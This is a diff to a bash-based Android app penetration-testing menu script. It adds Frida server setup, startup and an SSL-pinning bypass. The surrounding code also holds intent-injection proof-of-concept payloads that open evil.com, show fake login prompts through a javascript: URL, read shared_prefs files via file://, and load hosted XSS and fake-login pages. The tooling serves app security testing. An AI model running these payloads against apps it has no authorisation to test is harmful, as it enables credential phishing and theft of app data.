@@ -68,13 +68,17 @@ fi
 
 # Containers
 model=$(adb shell getprop ro.product.model)
+arch=$(adb shell getprop ro.product.cpu.abi)
 path="/Users/mdnahidalam/Desktop/android_security/target/" # Set your path
+frida_version="16.2.1" # you can change the version
+frida_arm64="https://github.com/frida/frida/releases/download/"$frida_version"/frida-server-"$frida_version"-android-arm64.xz" # URL of the frida server
+frida_x86="https://github.com/frida/frida/releases/download/"$frida_version"/frida-server-"$frida_version"-android-x86.xz" # URL of the frida server
 
 #BANNER
 function banner(){
     clear
     echo -e "\033[0;32m"
-    echo "⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿ v2.1"
+    echo "⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿ v3.0"
     echo "⣿⣿⣿⣿⣿⣿⠟⠃⠁⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣿⣿⣿"
     echo "⣿⣿⣿⣿⡿⠃⠀⣴⡄⠀⠀⠀⠀⠀⣴⡆⠀⠘⢿⣿⣿⣿⣿"
     echo "⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿"
@@ -93,9 +97,9 @@ function banner(){
 # Main Menu
 function menu(){
     banner
-    echo -e "\033[0;37m01. \033[0;32mAll Packages Names"
-    echo -e "\033[0;37m02. \033[0;32mShow Installed App Packages"
-    echo -e "\033[0;37m03. \033[0;32mExtract APK"
+    echo -e "\033[0;37m01. \033[0;32mAll Packages Names             \033[0;37m10. \033[0;32mSetup Frida-Server To Android"
+    echo -e "\033[0;37m02. \033[0;32mShow Installed App Packages    \033[0;37m11. \033[0;32mStart Frida-Server [Android]"
+    echo -e "\033[0;37m03. \033[0;32mExtract APK                    \033[0;37m12. \033[0;32mSSL Pinning Bypass [Frida]"
     echo -e "\033[0;37m04. \033[0;32mDecompile APK [JADX]"
     echo -e "\033[0;37m05. \033[0;32mDecompile APK [Apktool]"
     echo -e "\033[0;37m06. \033[0;32mRun Activity"
@@ -196,6 +200,8 @@ while true; do
         read -p "[$model] package name> " package_name
         read -p "[$model] activity name> " activity_name
         read -p "[$model] string name> " string
+        java_package="$package_name"
+        java_activity="$activity_name"
         # Check if the package name exists in the activity name
         if [[ $activity_name == *"$package_name"* ]]; then
             # Remove the package name from the activity name
@@ -218,14 +224,15 @@ while true; do
             banner
             website="https://evil.com"
             adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
+            echo -e "\nADB PoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
+            
         
         #JavaScript Alert
         elif [ "$website_option" == "2" ]; then
             banner
             website="https://nahid0x1.github.io/xss.html"
             adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
+            echo -e "\nADB PoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
         
         #Kill Process
         elif [ "$website_option" == "3" ]; then
@@ -240,7 +247,8 @@ while true; do
             sleep 1
             adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "$string" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert"
             payload=
-            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "$string" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert""
+            echo -e "\nADB PoC: adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "$string" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert""
+            
         
         #LFI
         elif [ "$website_option" == "5" ]; then
@@ -248,7 +256,8 @@ while true; do
             adb shell ls /data/data/$package_name/shared_prefs/
             read -p "[$model] file name> " file_name_lfi
             adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///data/data/$package_name/shared_prefs/$file_name_lfi" --es "type" "alert"
-            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///data/data/$package_name/shared_prefs/$file_name_lfi" --es "type" "alert""
+            echo -e "\nADB PoC: adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///data/data/$package_name/shared_prefs/$file_name_lfi" --es "type" "alert""
+            
 
         #Read File or Load
         elif [ "$website_option" == "6" ]; then
@@ -263,14 +272,16 @@ while true; do
             banner
             website="https://nahid0x1.github.io/fakelogin.html"
             adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
+            echo -e "\nADB PoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
+            
 
         #Fake Login Page [JavaScript]
         elif ["$website_option" == "8" ]; then
             banner
             website="https://nahid0x1.github.io/xss2.html"
             adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
+            echo -e "\nADB PoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
+            
 
         else
             echo "Wrong Option"
@@ -285,6 +296,72 @@ while true; do
         banner
         adb install $apk
         echo "App Installed"
+        read -p "Press ENTER to Clear" enter
+
+    elif [ "$input" == "10" ]; then
+        banner
+        if [ -f "cert-der.crt" ]; then
+            banner
+            echo -e "cert-der.crt [File Found]"
+        else
+            banner
+            echo -e "cert-der.crt file not found!\nexport burp certificate and set the certificate file name cert-der.crt"
+            exit
+        fi
+
+
+        # Check if architecture is arm64
+        if [[ $arch == *"arm64"* ]]; then
+            banner
+            wget --quiet --show-progress "$frida_arm64" -O frida-server.xz
+
+            # Check if the file was downloaded successfully
+            if [ $? -ne 0 ]; then
+                banner
+                echo "Maybe version changed"
+                exit
+            fi
+            banner
+            xz -d frida-server.xz
+            adb push frida-server /data/local/tmp
+            adb push cert-der.crt /data/local/tmp
+            adb shell "chmod +x /data/local/tmp/frida-server"
+
+        # Check if architecture is x86
+        elif [[ $arch == *"x86"* ]]; then
+            banner
+            wget --quiet --show-progress "$frida_x86" -O frida-server.xz
+
+            # Check if the file was downloaded successfully
+            if [ $? -ne 0 ]; then
+                banner
+                echo "Maybe version changed!"
+                exit
+            fi
+            banner
+            xz -d frida-server.xz
+            adb push frida-server /data/local/tmp
+            adb push cert-der.crt /data/local/tmp
+            adb shell "chmod +x /data/local/tmp/frida-server"
+
+            echo -e " "
+            read -p "Press ENTER to Clear" enter
+
+        else
+            echo "Unknown architecture: $arch"
+        fi
+    
+    elif [ "$input" == "11" ]; then
+        banner
+        adb shell "/data/local/tmp/frida-server" &
+        echo -e "Frida Server Started\n"
+        read -p "Press ENTER to Clear" enter
+    
+    elif [ "$input" == "12" ]; then
+        banner
+        read -p "[$model] package name> " bypass_package_name
+        frida --codeshare akabe1/frida-multiple-unpinning -f $bypass_package_name -U
+        echo -e "\n"
         read -p "Press ENTER to Clear" enter
 
 
@@ -308,6 +385,7 @@ while true; do
 
     elif [ "$input" == "linux" ]; then
         sudo apt install -y python3 openjdk apktool jadx adb
+        pip3 install frida
         pip3 install frida-tools
         pip3 install objection
     elif [ "$input" == "mac" ]; then
@@ -315,6 +393,7 @@ while true; do
         brew install jadx
         brew install android-platform-tools
         brew install openjdk
+        pip3 install frida
         pip3 install frida-tools
         pip3 install objection
 
